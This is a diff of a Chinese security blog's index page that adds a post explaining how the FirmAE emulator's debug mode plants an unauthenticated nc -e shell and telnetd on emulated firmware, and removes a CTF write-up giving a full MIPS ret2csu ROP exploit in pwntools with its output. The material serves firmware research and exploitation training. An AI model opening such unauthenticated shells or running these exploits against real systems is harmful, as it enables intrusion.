@@ -566,6 +566,98 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/FirmAE%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0debug%E5%8A%9F%E8%83%BD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/FirmAE%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0debug%E5%8A%9F%E8%83%BD/" class="post-title-link" itemprop="url">FirmAE：如何实现debug功能</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-06 12:53:33" itemprop="dateCreated datePublished" datetime="2023-04-06T12:53:33+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-19 16:50:25" itemprop="dateModified" datetime="2023-04-19T16:50:25+08:00">2023-04-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/FirmAE/" itemprop="url" rel="index"><span itemprop="name">FirmAE</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="调试功能简介"><a href="#调试功能简介" class="headerlink" title="调试功能简介"></a>调试功能简介</h2><p>FirmAE相比FirmAdyne增加了一个新的启动选项，-d，可以为仿真系统开启一个调试功能，使用者可以连接到仿真系统中，开启shell、指令命令、启动gdbserver调试进程等等。通过阅读代码，调试功能的本质就是将一个自启动脚本塞入到固件文件系统中，仿真系统启动后使用nc和telnetd等待宿主机连接，其中的gdbserver、tcpdump、file transfer都是在宿主机连接上仿真系统后，发送命令到仿真系统执行的方式启动的。<br>这个功能还是非常人性化的。在真实设备上或许还可以通过硬件接口连接到bootloader获取shell来开启调试，FirmAE的调试模式可以极大帮助使用者对成功仿真的系统进行调试。</p>
+<h2 id="run-sh：启动脚本"><a href="#run-sh：启动脚本" class="headerlink" title="run.sh：启动脚本"></a>run.sh：启动脚本</h2><p>首先，如果是在启动脚本中使用了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">elif [ $&#123;OPTION&#125; = &quot;debug&quot; ]; then</span><br><span class="line">    # ================================</span><br><span class="line">    # run debug mode.</span><br><span class="line">    # ================================</span><br><span class="line">    if ($PING_RESULT); then</span><br><span class="line">        echo -e &quot;[\033[32m+\033[0m] Run debug!&quot;</span><br><span class="line">        IP=`cat $&#123;WORK_DIR&#125;/ip`</span><br><span class="line">        ./scratch/$IID/run_debug.sh &amp;</span><br><span class="line">        check_network $&#123;IP&#125; true</span><br><span class="line"></span><br><span class="line">        sleep 10</span><br><span class="line">        ./debug.py $&#123;IID&#125;</span><br><span class="line"></span><br><span class="line">        sync</span><br><span class="line">        kill $(ps aux | grep `get_qemu $&#123;ARCH&#125;` | awk &#x27;&#123;print $2&#125;&#x27;) 2&gt; /dev/null | true</span><br><span class="line">        sleep 2</span><br><span class="line">    else</span><br><span class="line">        echo -e &quot;[\033[31m-\033[0m] Network unreachable&quot;</span><br><span class="line">    fi</span><br></pre></td></tr></table></figure>
+<p>会在对应的固件目录（以$IID标识）中，后台运行run_debug.sh，等运行完毕后，使用debug.py去连接到仿真的系统中。</p>
+<h2 id="run-debug-sh：仿真系统中监听"><a href="#run-debug-sh：仿真系统中监听" class="headerlink" title="run_debug.sh：仿真系统中监听"></a>run_debug.sh：仿真系统中监听</h2><p>run_debug.sh的主要作用就是将如下的脚本写入到仿真系统中，并在启动仿真后，执行如下的脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#!/firmadyne/sh&quot; &gt; $&#123;WORK_DIR&#125;/image/firmadyne/debug.sh</span><br><span class="line">if (echo $&#123;RUN_MODE&#125; | grep -q &quot;debug&quot;); then</span><br><span class="line">    echo &quot;while (true); do /firmadyne/busybox nc -lp 31337 -e /firmadyne/sh; done &amp;&quot; &gt;&gt; $&#123;WORK_DIR&#125;/image/firmadyne/debug.sh</span><br><span class="line">    echo &quot;/firmadyne/busybox telnetd -p 31338 -l /firmadyne/sh&quot; &gt;&gt; $&#123;WORK_DIR&#125;/image/firmadyne/debug.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>在run_debug.sh中，会在仿真系统的&#x2F;firmadyne目录生成debug.sh，debug.sh即运行在仿真系统中。在debug.sh中，会使用nc去监听端口31337，并使用telnetd开启telnet到31338端口</p>
+<h2 id="debug-py：宿主机连接"><a href="#debug-py：宿主机连接" class="headerlink" title="debug.py：宿主机连接"></a>debug.py：宿主机连接</h2><p>在宿主机上是通过debug.py来显示调试界面，根据用户的输入来选择功能。代码比较简单，只有一个类firmae_helper：</p>
+<ul>
+<li>connect方法：连接到仿真系统nc开启的端口31337</li>
+<li>send和sendrecv：连接成功后，发送命令到仿真系统执行</li>
+<li>initalize_telnet：发送命令到仿真系统执行，初始化telnet</li>
+<li>connect_socat和connect_shell：分别通过nc和telnet连接到仿真系统中</li>
+<li>tcpdump、file_transfer、run_gdbserver：通过发送命令的方式启动对应功能</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%87%BD%E6%95%B0%E7%B2%92%E5%BA%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1238,94 +1330,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/04/ret2csu_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/04/ret2csu_mipsel/" class="post-title-link" itemprop="url">ret2csu_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-04 03:34:42" itemprop="dateCreated datePublished" datetime="2023-04-04T03:34:42+08:00">2023-04-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:07" itemprop="dateModified" datetime="2023-04-11T13:57:07+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>ret2csu就是使用_libc_csu_init中的代码片段来达到调用任意三个（及以下）函数的ROP作用。此处查看_libc_csu_init函数中的两段代码片段：<br>这段代码可以从栈上恢复s0~s5、ra，并跳转到ra去执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004009C0 loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class="line">.text:004009C0                 lw      $ra, 0x1C+var_s18($sp)</span><br><span class="line">.text:004009C4                 lw      $s5, 0x1C+var_s14($sp)</span><br><span class="line">.text:004009C8                 lw      $s4, 0x1C+var_s10($sp)</span><br><span class="line">.text:004009CC                 lw      $s3, 0x1C+var_sC($sp)</span><br><span class="line">.text:004009D0                 lw      $s2, 0x1C+var_s8($sp)</span><br><span class="line">.text:004009D4                 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004009D8                 lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004009DC                 jr      $ra</span><br><span class="line">.text:004009E0                 addiu   $sp, 0x38</span><br></pre></td></tr></table></figure>
-<p>这段代码可以从s系列寄存器恢复到a0、a1、a2、t9，达到调用三参数函数的作用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004009A0 loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j</span><br><span class="line">.text:004009A0                 lw      $t9, 0($s0)</span><br><span class="line">.text:004009A4                 addiu   $s1, 1</span><br><span class="line">.text:004009A8                 move    $a2, $s5</span><br><span class="line">.text:004009AC                 move    $a1, $s4</span><br><span class="line">.text:004009B0                 jalr    $t9</span><br><span class="line">.text:004009B4                 move    $a0, $s3</span><br></pre></td></tr></table></figure>
-<p>接下来还是查看一下pwnme函数：缓冲区起始地址在sp+0x18，返回地址保存在sp+0x3c，可以控制的输入大小是0x200。<br>利用过程：<br>还是先溢出覆盖到返回地址，控制到从栈上恢复寄存器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(load_regs)</span><br></pre></td></tr></table></figure>
-<p>然后从寄存器恢复函数参数，并从GOT表调用ret2win函数：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">rop += p32(ret2win_got) <span class="comment"># ret2win,s0</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s1无用</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s2无用</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>) <span class="comment"># s3-&gt;a0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>) <span class="comment"># s4-&gt;a1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>) <span class="comment"># s5-&gt;a2</span></span><br><span class="line">rop += p32(call_ret2win)</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./ret2csu_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">load_regs = <span class="number">0x004009C0</span></span><br><span class="line"></span><br><span class="line">ret2win_got = <span class="number">0x00411058</span></span><br><span class="line">call_ret2win = <span class="number">0x004009A0</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(load_regs)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">rop += p32(ret2win_got) <span class="comment"># ret2win,s0</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s1无用</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s2无用</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>) <span class="comment"># s3-&gt;a0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>) <span class="comment"># s4-&gt;a1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>) <span class="comment"># s5-&gt;a2</span></span><br><span class="line">rop += p32(call_ret2win)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>效果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 ret2csu.py</span></span><br><span class="line">[*] &#x27;/home/utest/rop_practice/mipsel/ret2csu_mipsel/ret2csu_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1395,7 +1399,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
